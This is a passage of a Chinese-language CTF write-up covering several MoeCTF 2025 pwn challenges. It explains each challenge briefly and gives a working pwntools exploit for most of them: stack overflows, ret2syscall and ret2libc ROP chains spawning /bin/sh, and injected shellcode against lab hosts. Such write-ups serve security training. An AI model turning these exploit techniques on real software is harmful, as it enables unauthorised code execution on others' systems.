class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">ls      = <span class="keyword">lambda</span> data               :log.success(data)</span><br><span class="line">p       = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">password = [<span class="number">9383</span>,<span class="number">886</span>,<span class="number">2777</span>,<span class="number">6915</span>,<span class="number">7793</span>,<span class="number">8335</span>,<span class="number">5386</span>,<span class="number">492</span>,<span class="number">6649</span>,<span class="number">1421</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    sla(<span class="string">b&quot;password&quot;</span>, <span class="built_in">str</span>(password[i]).encode())</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h2 id="str-check"><a href="#str-check" class="headerlink" title="str_check"></a>str_check</h2><h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><p>str类函数：例如strcpy、strcat、strcmp、strlen等函数会被\x00截断</p>
<h3 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;192.168.???.??&quot;</span>, <span class="number">51927</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">ls      = <span class="keyword">lambda</span> data               :log.success(data)</span><br><span class="line">p       = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x40123E</span></span><br><span class="line">payload = <span class="string">b&quot;meow&quot;</span> + <span class="string">b&quot;\x00&quot;</span>*(<span class="number">0x24</span>) + p64(backdoor)</span><br><span class="line">sla(<span class="string">b&quot;What can u say?&quot;</span>, payload)</span><br><span class="line">sla(<span class="string">b&quot;So,what size is it?&quot;</span>, <span class="string">b&quot;256&quot;</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h2 id="syslock"><a href="#syslock" class="headerlink" title="syslock"></a>syslock</h2><h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><p>题型为ret2syscall，变量<code>i</code>与<code>s</code>都位于bss段上，并且<code>i</code>紧邻着<code>s</code>，位于<code>s</code>的上方，对<code>i</code>输入负数，即可在</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;s + i, <span class="number">0xCu</span>LL);</span><br></pre></td></tr></table></figure>

<p>这一步进行负数前溢出，改<code>i</code>为59，并写入<code>/bin/sh\x00</code>（为下一步的系统调用 <code>execve(/bin/sh,0,0) </code>准备参数）</p>
<p>顺便附上全部函数的系统调用号参考：<a target="_blank" rel="noopener" href="https://syscalls.mebeim.net/?table=x86/64/x64/latest">https://syscalls.mebeim.net/?table=x86/64/x64/latest</a></p>
<h3 id="EXP-7"><a href="#EXP-7" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;192.168.???.??&quot;</span>, <span class="number">60740</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">ls      = <span class="keyword">lambda</span> data               :log.success(data)</span><br><span class="line">p       = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">pop_rdi_rsi_rdx = <span class="number">0x401240</span></span><br><span class="line">syscall = <span class="number">0x401230</span></span><br><span class="line">pop_rax = <span class="number">0x401244</span></span><br><span class="line">bss = <span class="number">0x404084</span></span><br><span class="line">sla(<span class="string">b&quot;choose mode&quot;</span>, <span class="string">b&quot;-32&quot;</span>)</span><br><span class="line">sa(<span class="string">b&quot;Input your password&quot;</span>, <span class="string">b&quot;\x3B\x00\x00\x00&quot;</span> + <span class="string">b&quot;/bin/sh\x00&quot;</span>) <span class="comment">##以小端序的形式写入59才行，并且此处刚好0xC个字节，注意不要用sendline()</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*(<span class="number">0x48</span>) + p64(pop_rdi_rsi_rdx) + p64(bss) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(pop_rax) + p64(<span class="number">0x3b</span>) +  p64(syscall)</span><br><span class="line">sla(<span class="string">b&quot;Developer Mode.\n&quot;</span>, payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h2 id="eazylibc"><a href="#eazylibc" class="headerlink" title="eazylibc"></a>eazylibc</h2><h3 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h3><p>这个题的题型是ret2libc，但它着重考察了<strong>函数动态链接与延迟绑定</strong>，附件开启了ASLR**（地址空间布局随机化）<strong>和PIE</strong>（位置无关可执行文件）**，第一次打印<code>&amp;read</code>时，程序还未有调用过<code>read()</code>函数，初次调用函数，会直接跳转到read@got（got表中 read 的地址）所以会打印read@plt的地址，也就是IDA程序中的<code>0x1060</code>处的真实地址，<strong>即可得到程序的<code>pie</code></strong>。我们覆盖返回地址为main()，程序会再次打印<code>&amp;read</code>，这次会直接跳转到read@plt（plt表中 read 的地址），这下就会给出<code>read()</code>的真实地址，<strong>即可得到<code>libc_base</code></strong>，再打正常的ret2libc就好</p>
<h3 id="EXP-8"><a href="#EXP-8" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;192.168.???.??&quot;</span>, <span class="number">51595</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">ls      = <span class="keyword">lambda</span> data               :log.success(data)</span><br><span class="line">p       = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">ru(<span class="string">b&quot;How can I use 0x&quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">ls(<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">pie = addr - <span class="number">0x1060</span></span><br><span class="line">ls(<span class="built_in">hex</span>(pie))</span><br><span class="line">main = <span class="number">0x11D3</span> + pie</span><br><span class="line">pad = <span class="string">b&quot;\x00&quot;</span>*(<span class="number">0x28</span>) + p64(main)</span><br><span class="line">sa(<span class="string">b&quot;Damn!&quot;</span>, pad)</span><br><span class="line">ru(<span class="string">b&quot;How can I use 0x&quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">ls(<span class="built_in">hex</span>(addr))</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">ls(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line">pop_rdi = <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdi; ret;&quot;</span>)))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*(<span class="number">0x28</span>) + p64(pop_rdi + <span class="number">1</span>) + p64(pop_rdi) + p64(bin_sh) + p64(system)</span><br><span class="line">sla(<span class="string">b&quot;Damn!&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><h3 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h3><h4 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h4><p>控制程序执行shellcode代码，shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell，或者open read write获取并输出flag，通常情况下shellcode需要我们自行编写，即向内存中填充一些可执行的代码</p>
<p>前提条件：shellcode所在的区域具有可执行权限</p>
<p>还可以了解一下mprotect()函数，<code>mprotect</code> 是一个非常重要的系统调用，用于修改内存区域的访问权限。在你提供的代码中，它被用来改变之前通过 <code>mmap</code> 分配的内存区域的权限。</p>
<p>函数原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure>

<p>参数解释：</p>
<ol>
<li><strong><code>void \*addr</code></strong> (<code>s</code> 在代码中)<ul>
<li>要修改权限的内存区域的起始地址</li>
<li>必须是页对齐的（通常是4096字节的倍数）</li>
<li>在代码中，这是 <code>mmap</code> 返回的地址 <code>s</code></li>
</ul>
</li>
<li><strong><code>size_t len</code></strong> (<code>0x1000uLL</code> 在代码中)<ul>
<li>要修改的内存区域长度（字节数）</li>
<li>代码中设置为 <code>0x1000</code>（4096字节，即一页大小）</li>
<li>同样需要页对齐</li>
</ul>
</li>
<li><strong><code>int prot</code></strong> (<code>prot</code> 在代码中)<ul>
<li>新的保护权限标志，通过位或(<code>|</code>)组合：<ul>
<li><code>PROT_READ</code> (1): 可读</li>
<li><code>PROT_WRITE</code> (2): 可写</li>
<li><code>PROT_EXEC</code> (4): 可执行</li>
</ul>
</li>
<li>代码中 <code>prot</code> 的值取决于用户的选择</li>
</ul>
</li>
</ol>
<p>在题目中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mprotect(s, <span class="number">0x1000u</span>LL, prot) == <span class="number">-1</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;mprotect&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>修改 <code>s</code> 指向的内存区域（大小为4096字节）的权限</li>
<li>新权限由我们选择的 <code>prot</code> 值决定</li>
<li>如果失败（返回-1），打印错误并退出</li>
</ol>
<p>每个选项对应不同的内存权限组合：</p>
<ul>
<li>1: <code>PROT_READ</code> (1)</li>
<li>2: <code>PROT_READ|PROT_WRITE</code> (3)</li>
<li>3: <code>PROT_READ|PROT_EXEC</code> (5)</li>
<li>4: <code>PROT_READ|PROT_WRITE|PROT_EXEC</code> (7)</li>
</ul>
<p><strong>为什么PROT_READ&#x3D;1，PROT_WRITE &#x3D; 2， PROT_EXEC &#x3D; 4？</strong></p>
<p>涉及到<strong>位掩码的基本原理</strong>，简单来说：在计算机中，<strong>单个整数的每个二进制位可以独立表示一个布尔状态（0&#x2F;1）</strong>。通过为每种权限分配一个独立的二进制位，可以实现权限的组合与检查：</p>
<table>
<thead>
<tr>
<th align="left">权限</th>
<th align="left">二进制值</th>
<th align="left">十进制值</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>PROT_READ</code></td>
<td align="left"><code>001</code></td>
<td align="left">1</td>
</tr>
<tr>
<td align="left"><code>PROT_WRITE</code></td>
<td align="left"><code>010</code></td>
<td align="left">2</td>
</tr>
<tr>
<td align="left"><code>PROT_EXEC</code></td>
<td align="left"><code>100</code></td>
<td align="left">4</td>
</tr>
</tbody></table>
<ul>
<li>每个权限对应一个 <strong>唯一的二进制位</strong>，互不重叠。</li>
<li>通过 <strong>按位或（<code>|</code>）</strong> 组合权限</li>
</ul>
<h3 id="EXP-9"><a href="#EXP-9" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;192.168.???.??&quot;</span>, <span class="number">50547</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Choose wisely!\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">shellcode = shellcraft.sh()  <span class="comment">##生成可以getshell的机器码</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;think about the permissions you just set.\n&quot;</span>)</span><br><span class="line">io.sendline(asm(shellcode))  <span class="comment">## 使用asm()将汇编代码转换为对应的机器码</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="find-it"><a href="#find-it" class="headerlink" title="find it"></a>find it</h2><h3 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h3><p>在 Linux 中，每个进程都会维护一个 <strong>fd 表</strong>，本质是指向内核的打开文件对象。</p>
<ul>
<li>默认情况下：<ul>
<li><code>0</code> → <code>stdin</code>（标准输入）</li>
<li><code>1</code> → <code>stdout</code>（标准输出）</li>
<li><code>2</code> → <code>stderr</code>（标准错误）</li>
</ul>
</li>
</ul>
<p>当我们调用 <code>dup(1)</code> 时，系统会找到 <strong>最小的未使用的 fd</strong>，复制一份 <code>stdout</code>，并返回它。<br> 一般来说，新分配的第一个空闲 fd 就是 <strong>3</strong>。</p>
<p><strong>fd 的分配原则</strong>：从最小未使用的整数开始递增。</p>
<p><strong>dup()</strong>：复制一个现有 fd（共享同一文件对象），返回新的最小可用 fd。</p>
<p><strong>close()</strong>：释放该 fd，之后新的 open&#x2F;dup 可以复用。</p>
<p>程序刚开始在使用的fd有 0、1、2</p>
<p>经过复制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd = dup(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>后</p>
<p>1\3就可以共同表示标准输出</p>
<p><strong>标准输出和标准报错才会在我们的终端上有输出</strong></p>
<p>然后释放</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">close(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>此时，数字<code>1</code>就未被文件描述符<code>fd</code>使用，打开一个新文件，程序会使用一个当前未被使用的最小整数，来作为新文件的文件描述符fd</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(file, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>打开了一个文件，需要一个新的文件描述符来表示它，这是一种一对一关系，优先选取当前最小未使用的整数，也就是前面被释放的<code>1</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(fd2, &amp;buf, <span class="number">0x50u</span>LL);</span><br></pre></td></tr></table></figure>

<p>从对应文件（fd2处于文件描述符的位置，它被用来表示哪个文件，read就读取哪个文件）里读入0x50个字节到<code>buf</code></p>
<h3 id="EXP-10"><a href="#EXP-10" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">╭─icyice@icyice-virtual-machine ~/Desktop/MoeCTF/2025 </span><br><span class="line">╰─$ nc 192.168.???.?? 51138</span><br><span class="line">I&#x27;ve hidden the fd of stdout. Can you find it?</span><br><span class="line">3</span><br><span class="line">You are right.What would you like to see?</span><br><span class="line">flag</span><br><span class="line">What is its fd?</span><br><span class="line">1</span><br><span class="line">moectf&#123;FIND_the-HIDDeN-fD17a898463da&#125;</span><br></pre></td></tr></table></figure>



<h2 id="认识libc"><a href="#认识libc" class="headerlink" title="认识libc"></a>认识libc</h2><h3 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h3><p>ret2libc，直接得到printf_addr，算出libc_base，需要的一切在glibc里找，比如<code>pop_rdi_ret</code>、<code>/bin/sh\x00</code>、<code>system</code></p>
<h3 id="EXP-11"><a href="#EXP-11" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;192.168.???.??&quot;</span>, <span class="number">49770</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">ls      = <span class="keyword">lambda</span> data               :log.success(data)</span><br><span class="line">p       = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">ru(<span class="string">b&quot;&#x27;printf&#x27;: 0x&quot;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">ls(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line">pop_rdi = <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdi; ret;&quot;</span>)))</span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*(<span class="number">0x48</span>) + p64(pop_rdi + <span class="number">1</span>) + p64(pop_rdi) + p64(bin_sh) + p64(system)</span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>, payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h2 id="boom"><a href="#boom" class="headerlink" title="boom"></a>boom</h2><h3 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h3><p>输入 y ，是得 v6 &#x3D;1 &amp;&amp; <code>canary = canary;</code>。v6 &#x3D; 1即可进行栈溢出，用 <code>\x00</code>填满栈空间，虽然修改了 <code>canary</code> 但覆盖 v6 &#x3D; 0，不进入</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v6 &amp;&amp; canary != canary )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Security check failed!&quot;</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>有后门函数win()，就是ret2text</p>
<h3 id="EXP-12"><a href="#EXP-12" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;192.168.???.??&quot;</span>, <span class="number">54549</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">False</span>  :io.recvuntil(delims, drop)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">ls      = <span class="keyword">lambda</span> data               :log.success(data)</span><br><span class="line">p       = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">sla(<span class="string">b&quot;Do you want to brute-force this system? (y/n)&quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line">win = <span class="number">0x40127E</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*(<span class="number">0x98</span>) + p64(win)</span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h2 id="boom-revenge"><a href="#boom-revenge" class="headerlink" title="boom_revenge"></a>boom_revenge</h2><h3 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h3><p>输入 y ，是得 v6 &#x3D;1 &amp;&amp; <code>canary = canary;</code>。v6 &#x3D; 1即可进行栈溢出，但是<code>canary</code>不能修改，必须覆盖相同的值才能避免<code>exit(1)</code>，这就要会生成伪随机数了</p>
